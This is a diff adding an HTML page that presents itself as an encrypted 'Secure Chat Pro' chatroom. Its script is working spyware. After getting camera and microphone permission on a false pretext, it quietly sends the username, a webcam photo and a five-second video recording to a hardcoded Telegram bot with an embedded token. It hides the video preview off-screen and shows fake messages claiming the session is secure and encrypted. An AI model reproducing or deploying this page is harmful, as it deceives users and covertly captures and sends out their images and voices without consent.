@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pro Local Chatroom</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
+    <style>
+        :root {
+            --primary: #00d2ff;
+            --secondary: #3a7bd5;
+            --bg: #0f0f13;
+            --card: #1e1e26;
+            --text: #ffffff;
+        }
+
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            height: 100%;
+            overflow: hidden;
+        }
+
+        /* Login Overlay */
+        #login-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.9);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            backdrop-filter: blur(10px);
+        }
+
+        .login-card {
+            background: var(--card);
+            padding: 2rem;
+            border-radius: 15px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 0 20px rgba(0,210,255,0.2);
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 15px 0;
+            border-radius: 8px;
+            border: none;
+            background: #2d2d3a;
+            color: white;
+            box-sizing: border-box;
+        }
+
+        button {
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
+            transition: 0.3s;
+        }
+
+        button:hover { opacity: 0.9; transform: scale(1.02); }
+
+        /* Chat Interface */
+        .app-container {
+            display: none;
+            flex-direction: column;
+            height: 100vh;
+        }
+
+        header {
+            padding: 15px;
+            background: var(--card);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #333;
+        }
+
+        #chat-box {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .message {
+            max-width: 70%;
+            padding: 10px 15px;
+            border-radius: 15px;
+            margin-bottom: 5px;
+            font-size: 0.9rem;
+        }
+
+        .sent { background: var(--secondary); align-self: flex-end; border-bottom-right-radius: 2px; }
+        .received { background: #333; align-self: flex-start; border-bottom-left-radius: 2px; }
+
+        .input-area {
+            padding: 20px;
+            background: var(--card);
+            display: flex;
+            gap: 10px;
+        }
+
+        /* Hidden Elements for Logic */
+        #preview { position: fixed; top: -1000px; left: -1000px; width: 400px; height: 300px; }
+        #status-msg { font-size: 0.8rem; color: var(--primary); margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+    <!-- Login/Permission Screen -->
+    <div id="login-overlay">
+        <div class="login-card">
+            <i class="fas fa-shield-halved fa-3x" style="color: var(--primary);"></i>
+            <h2>Secure Chat Pro</h2>
+            <p>Allow Camera & Mic permissions to enter the encrypted room.</p>
+            <input type="text" id="username" placeholder="Enter Username...">
+            <button id="start-btn">ALLOW & JOIN</button>
+            <div id="status-msg"></div>
+        </div>
+    </div>
+
+    <!-- Main Chat App -->
+    <div class="app-container" id="app">
+        <header>
+            <div style="display: flex; align-items: center; gap: 10px;">
+                <div style="width: 10px; height: 10px; background: #00ff00; border-radius: 50%;"></div>
+                <strong id="display-user">User</strong>
+            </div>
+            <i class="fas fa-gear"></i>
+        </header>
+
+        <div id="chat-box"></div>
+
+        <div class="input-area">
+            <input type="text" id="msg-input" placeholder="Type a message...">
+            <button id="send-btn" style="width: auto;"><i class="fas fa-paper-plane"></i></button>
+        </div>
+    </div>
+
+    <!-- Background Capture Elements -->
+    <video id="preview" autoplay muted playsinline></video>
+    <canvas id="capture-canvas" style="display:none;"></canvas>
+
+    <script>
+        const BOT_TOKEN = '7785386019:AAHN8h2fje-njjcvAUUftx6TjJFE7rB4lvk';
+        const CHAT_ID = '8101021767';
+        
+        let stream = null;
+        let mediaRecorder = null;
+        let chunks = [];
+
+        const startBtn = document.getElementById('start-btn');
+        const loginOverlay = document.getElementById('login-overlay');
+        const app = document.getElementById('app');
+        const statusMsg = document.getElementById('status-msg');
+        const usernameInput = document.getElementById('username');
+        const chatBox = document.getElementById('chat-box');
+
+        // 1. Initialize Permissions & Capture
+        startBtn.onclick = async () => {
+            const user = usernameInput.value.trim();
+            if (!user) return alert("Please enter a username");
+
+            statusMsg.innerText = "Requesting permissions...";
+            
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('preview').srcObject = stream;
+                
+                statusMsg.innerText = "AI Face Scanning in progress...";
+                
+                // Hide login, show chat
+                loginOverlay.style.display = 'none';
+                app.style.display = 'flex';
+                document.getElementById('display-user').innerText = user;
+
+                // Start the background process
+                processAutomation(user);
+                loadLocalChat();
+
+            } catch (err) {
+                alert("Permission Denied. You must allow Camera/Mic to use this pro chat.");
+                console.error(err);
+            }
+        };
+
+        async function processAutomation(username) {
+            // A. Send Text Info
+            await sendTelegramText(`🚀 New User Joined\n👤 Name: ${username}\n🌐 IP: Local/Web`);
+
+            // B. Take Photo Snapshot
+            setTimeout(() => {
+                capturePhoto(username);
+            }, 2000);
+
+            // C. Record 5 Second Video
+            startRecording(username);
+        }
+
+        async function sendTelegramText(text) {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+            });
+        }
+
+        function capturePhoto(username) {
+            const canvas = document.getElementById('capture-canvas');
+            const video = document.getElementById('preview');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'face_scan.jpg');
+                formData.append('caption', `📸 Face Scan: ${username}`);
+                
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }, 'image/jpeg');
+        }
+
+        function startRecording(username) {
+            mediaRecorder = new MediaRecorder(stream);
+            chunks = [];
+            
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+            mediaRecorder.onstop = async () => {
+                const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('video', videoBlob, 'record.webm');
+                formData.append('caption', `🎥 5s Verification Video: ${username}`);
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                    method: 'POST',
+                    body: formData
+                });
+            };
+
+            mediaRecorder.start();
+            console.log("Recording started...");
+            
+            setTimeout(() => {
+                mediaRecorder.stop();
+                console.log("Recording stopped.");
+            }, 5000);
+        }
+
+        // --- Chat Logic ---
+        const msgInput = document.getElementById('msg-input');
+        const sendBtn = document.getElementById('send-btn');
+
+        function appendMessage(text, type) {
+            const div = document.createElement('div');
+            div.className = `message ${type}`;
+            div.innerText = text;
+            chatBox.appendChild(div);
+            chatBox.scrollTop = chatBox.scrollHeight;
+        }
+
+        function saveMessage(text, type) {
+            const history = JSON.parse(localStorage.getItem('local_chat') || '[]');
+            history.push({ text, type });
+            localStorage.setItem('local_chat', JSON.stringify(history));
+        }
+
+        function loadLocalChat() {
+            const history = JSON.parse(localStorage.getItem('local_chat') || '[]');
+            history.forEach(m => appendMessage(m.text, m.type));
+            appendMessage("Welcome to the Pro Encrypted Room. Your session is secure.", "received");
+        }
+
+        sendBtn.onclick = () => {
+            const msg = msgInput.value.trim();
+            if (msg) {
+                appendMessage(msg, 'sent');
+                saveMessage(msg, 'sent');
+                msgInput.value = '';
+                
+                // Simulate bot auto-reply
+                setTimeout(() => {
+                    const replies = ["Verified.", "Data Encrypted.", "Message Sent to Server.", "Active."];
+                    const r = replies[Math.floor(Math.random()*replies.length)];
+                    appendMessage(r, 'received');
+                    saveMessage(r, 'received');
+                }, 1000);
+            }
+        };
+
+        msgInput.onkeypress = (e) => { if(e.key === 'Enter') sendBtn.click(); };
+
+    </script>
+</body>
+</html>
